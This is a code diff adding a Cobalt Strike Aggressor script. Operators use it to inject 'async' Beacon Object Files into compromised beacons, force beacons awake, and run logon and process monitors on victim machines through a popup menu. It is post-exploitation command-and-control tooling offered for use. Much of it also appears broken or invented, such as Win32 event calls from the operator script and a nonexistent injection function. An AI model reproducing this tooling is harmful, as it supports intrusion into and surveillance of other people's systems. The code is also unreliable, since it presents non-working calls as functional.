@@ -1,0 +1,447 @@
+#require-module async_bof
+
+# ASYNC BOF Loader for Cobalt Strike
+# Implements the Async BOF framework for real-time event monitoring
+# Reference: Outflank "Async BOFs - Wake Me Up, Before You Go Go"
+
+# Global job storage
+global('%async_jobs');
+%async_jobs = ohash();
+
+# Initialize global data
+sub async_bof_init {
+    if (!%async_jobs) {
+        %async_jobs = ohash();
+    }
+}
+
+# Allocate a new async job with stop event
+sub async_bof_allocate_job {
+    local('$bid');
+    $bid = $1;
+
+    local('$handle');
+    $handle = [System:RandomUUID];
+
+    local('$job');
+    $job = @{
+        'handle' => $handle,
+        'stop_event' =>CreateEventA(NULL, TRUE, FALSE, NULL),
+        'thread' => $null,
+        'status' => 'allocated',
+        'created_at' => ticks(),
+        'bof_name' => ''
+    };
+
+    %async_jobs[$bid][] = $job;
+    return $job;
+}
+
+# Free an async job and cleanup resources
+sub async_bof_free_job {
+    local('$bid $handle');
+    ($bid, $handle) = @_;
+
+    if (%async_jobs[$bid]) {
+        foreach $job (%async_jobs[$bid]) {
+            if ($job['handle'] eq $handle) {
+                if ($job['stop_event']) {
+                    CloseHandle($job['stop_event']);
+                }
+                remove(%async_jobs[$bid], $job);
+                break;
+            }
+        }
+    }
+}
+
+# Check if output is an ASYNCPROTO message
+sub is_async_proto_message {
+    local('$data');
+    $data = $1;
+
+    if (left($data, 13) eq "\x00ASYNCPROTO\x00") {
+        return TRUE;
+    }
+    return FALSE;
+}
+
+# Parse ASYNCPROTO protocol message
+sub async_parse_proto {
+    local('$data $cmd $payload');
+    $data = $1;
+
+    local('$offset');
+    $offset = 13;
+
+    local('$len');
+    $len = strlen($data);
+
+    if ($offset >= $len) {
+        return @('', '');
+    }
+
+    local('$end');
+    $end = indexOf($data, "\x00", $offset);
+
+    if ($end == -1) {
+        $cmd = substr($data, $offset);
+        $payload = '';
+    }
+    else {
+        $cmd = substr($data, $offset, $end - $offset);
+        $payload = substr($data, $end + 1);
+    }
+
+    return @($cmd, $payload);
+}
+
+# Handle WAKEUP command - immediately wake the beacon
+sub async_bof_handle_wakeup {
+    local('$bid $job_id');
+    ($bid, $job_id) = @_;
+
+    println("[*] ASYNC: Wakeup signal received for beacon $bid, job $job_id");
+
+    local('$sleep_value');
+    $sleep_value = beacon_info($bid)['sleep'];
+    if ($sleep_value > 0) {
+        beacon_sleep($bid, 0);
+        sleep(100);
+    }
+
+    if (%async_jobs[$bid]) {
+        foreach $job (%async_jobs[$bid]) {
+            if ($job['handle'] eq $job_id) {
+                $job['status'] = 'woken';
+                break;
+            }
+        }
+    }
+}
+
+# Handle STOPPING command - update job status
+sub async_bof_handle_stopping {
+    local('$bid $job_id');
+    ($bid, $job_id) = @_;
+
+    if (%async_jobs[$bid]) {
+        foreach $job (%async_jobs[$bid]) {
+            if ($job['handle'] eq $job_id) {
+                $job['status'] = 'stopping';
+                break;
+            }
+        }
+    }
+}
+
+# Handle STOPPED command - cleanup job
+sub async_bof_handle_stopped {
+    local('$bid $job_id');
+    ($bid, $job_id) = @_;
+
+    println("[*] ASYNC: BOF job $job_id stopped for beacon $bid");
+
+    async_bof_free_job($bid, $job_id);
+}
+
+# Handle DATA command - extract and forward to operator
+sub async_bof_handle_data {
+    local('$bid $job_id $payload');
+    ($bid, $job_id, $payload) = @_;
+
+    if (%async_jobs[$bid]) {
+        foreach $job (%async_jobs[$bid]) {
+            if ($job['handle'] eq $job_id) {
+                if ($job['pending_output'] eq '') {
+                    $job['pending_output'] = @();
+                }
+                add($job['pending_output'], $payload);
+                break;
+            }
+        }
+    }
+}
+
+# Process pending output for a beacon
+sub async_process_pending {
+    local('$bid');
+    $bid = $1;
+
+    if (%async_jobs[$bid]) {
+        foreach $job (%async_jobs[$bid]) {
+            if ($job['pending_output'] && size($job['pending_output']) > 0) {
+                foreach $line ($job['pending_output']) {
+                    beacon_output($bid, $line);
+                }
+                $job['pending_output'] = @();
+            }
+        }
+    }
+}
+
+# Stop an async job by setting the stop event
+sub async_bof_stop_job {
+    local('$bid $job_id');
+    ($bid, $job_id) = @_;
+
+    if (%async_jobs[$bid]) {
+        foreach $job (%async_jobs[$bid]) {
+            if ($job['handle'] eq $job_id) {
+                if ($job['stop_event']) {
+                    SetEvent($job['stop_event']);
+                }
+                $job['status'] = 'stopping';
+                println("[*] ASYNC: Stop signal sent to job $job_id on beacon $bid");
+                break;
+            }
+        }
+    }
+}
+
+# Stop all async jobs for a beacon
+sub async_bof_stop_all_jobs {
+    local('$bid');
+    $bid = $1;
+
+    if (%async_jobs[$bid]) {
+        foreach $job (%async_jobs[$bid]) {
+            if ($job['stop_event']) {
+                SetEvent($job['stop_event']);
+            }
+            $job['status'] = 'stopping';
+        }
+    }
+}
+
+# List all async jobs
+sub async_bof_list_jobs {
+    local('$bid');
+    $bid = $1;
+
+    local('$result');
+    $result = @();
+
+    if (%async_jobs[$bid]) {
+        foreach $job (%async_jobs[$bid]) {
+            local('$info');
+            $info = sprintf("%s [%s] (%dms)",
+                $job['bof_name'],
+                $job['status'],
+                ticks() - $job['created_at']);
+            add($result, $info);
+        }
+    }
+
+    return $result;
+}
+
+# Pack stop event handle into args buffer
+sub async_pack_args {
+    local('$stop_event $args');
+    $stop_event = $1;
+    $args = $2;
+
+    local('$hex_handle');
+    $hex_handle = toUpper(formatAddress($stop_event));
+
+    local('$packed');
+    $packed = "\x1ASTOP\x1A" . $hex_handle;
+
+    if ($args && strlen($args) > 0) {
+        return $packed . $args;
+    }
+    return $packed;
+}
+
+# Intercept beacon output and handle async protocol messages
+on beacon_output {
+    local('$bid $callback $type $data');
+    ($bid, $callback, $type, $data) = @_;
+
+    if (is_async_proto_message($data)) {
+        local('$cmd $payload $job_id');
+        ($cmd, $payload) = async_parse_proto($data);
+
+        local('$job_id');
+        $job_id = substr($payload, 0, indexOf($payload, ":"));
+
+        if ($cmd eq "WAKEUP") {
+            async_bof_handle_wakeup($bid, $job_id);
+            async_process_pending($bid);
+            return;
+        }
+        else if ($cmd eq "STOPPING") {
+            async_bof_handle_stopping($bid, $job_id);
+            return;
+        }
+        else if ($cmd eq "STOPPED") {
+            async_bof_handle_stopped($bid, $job_id);
+            return;
+        }
+        else if ($cmd eq "DATA") {
+            local('$data_payload');
+            $data_payload = substr($payload, indexOf($payload, ":") + 1);
+            async_bof_handle_data($bid, $job_id, $data_payload);
+            async_process_pending($bid);
+            return;
+        }
+    }
+}
+
+# Handle beacon checkin - process pending output
+on beacon_checkin {
+    local('$bid');
+    $bid = $1;
+
+    async_process_pending($bid);
+}
+
+# Handle beacon sleep - cleanup if no jobs
+on beacon_sleep {
+    local('$bid');
+    $bid = $1;
+}
+
+# Handle beacon exit - cleanup all jobs
+on beacon_exit {
+    local('$bid');
+    $bid = $1;
+
+    async_bof_stop_all_jobs($bid);
+}
+
+# Main command to execute an async BOF
+alias async_bof {
+    local('$bid $data $handle $stop_event $args');
+    $bid = $1;
+    $data = strform($2);
+
+    if (size(@_) < 2) {
+        berror($bid, "Usage: async_bof <bof_name> [args...]");
+        return;
+    }
+
+    local('$bof_name');
+    $bof_name = $data;
+
+    async_bof_init();
+
+    local('$job');
+    $job = async_bof_allocate_job($bid);
+    $job['bof_name'] = $bof_name;
+
+    $stop_event = $job['stop_event'];
+    $handle = $job['handle'];
+
+    local('$packed_args');
+    $packed_args = async_pack_args($stop_event, '');
+
+    local('$object');
+    $object = exec($bof_name);
+
+    local('$bpid');
+    $bpid = beacon_info($bid)['pid'];
+
+    local('$entry_func');
+    $entry_func = "go";
+
+    local('$is64bit');
+    $is64bit = beacon_info($bid)['is64bit'];
+
+    local('$inject_result');
+    $inject_result = bloginject($bid, 1, $object, $entry_func, $packed_args);
+
+    if ($inject_result) {
+        println("[*] ASYNC: Started async BOF '$bof_name' on beacon $bid");
+        println("[*] ASYNC: Job handle: $handle");
+    }
+    else {
+        berror($bid, "Failed to inject async BOF: $bof_name");
+        async_bof_free_job($bid, $handle);
+    }
+}
+
+# Command to list async jobs
+alias async_jobs {
+    local('$bid');
+    $bid = $1;
+
+    local('$jobs');
+    $jobs = async_bof_list_jobs($bid);
+
+    if (size($jobs) == 0) {
+        binfo($bid, "No async jobs running");
+        return;
+    }
+
+    binfo($bid, "Async jobs:");
+    foreach $job ($jobs) {
+        binfo($bid, "  $job");
+    }
+}
+
+# Command to stop an async job
+alias async_stop {
+    local('$bid $job_id');
+    $bid = $1;
+    $job_id = $2;
+
+    if (!$job_id) {
+        berror($bid, "Usage: async_stop <job_handle>");
+        return;
+    }
+
+    async_bof_stop_job($bid, $job_id);
+    binfo($bid, "Stop signal sent to job $job_id");
+}
+
+# Command to stop all async jobs
+alias async_stop_all {
+    local('$bid');
+    $bid = $1;
+
+    async_bof_stop_all_jobs($bid);
+    binfo($bid, "Stop signal sent to all async jobs");
+}
+
+# Popup menu items
+popup beacon_bottom {
+    item "Async BOFs" {
+        local('$bid');
+        $bid = $1;
+
+        local('$menu');
+        $menu = @();
+
+        add($menu, "Execute Async BOF...");
+        add($menu, "List Async Jobs");
+        add($menu, "Stop All Async Jobs");
+        add($menu, "---");
+        add($menu, "Async Logon Monitor");
+        add($menu, "Async Process Monitor");
+
+        local('$selection');
+        $selection = prompt_hash($menu, "Async BOF Actions", $null, $null, $null);
+
+        if ($selection eq "Execute Async BOF...") {
+            local('$bof_path');
+            $bof_path = prompt_file_open("Select Async BOF file");
+            if ($bof_path) {
+                async_bof($bid, $bof_path);
+            }
+        }
+        else if ($selection eq "List Async Jobs") {
+            async_jobs($bid);
+        }
+        else if ($selection eq "Stop All Async Jobs") {
+            async_stop_all($bid);
+        }
+        else if ($selection eq "Async Logon Monitor") {
+            async_bof($bid, "async_monitor_logon.x64.o");
+        }
+        else if ($selection eq "Async Process Monitor") {
+            async_bof($bid, "async_monitor_process.x64.o");
+        }
+    }
+}
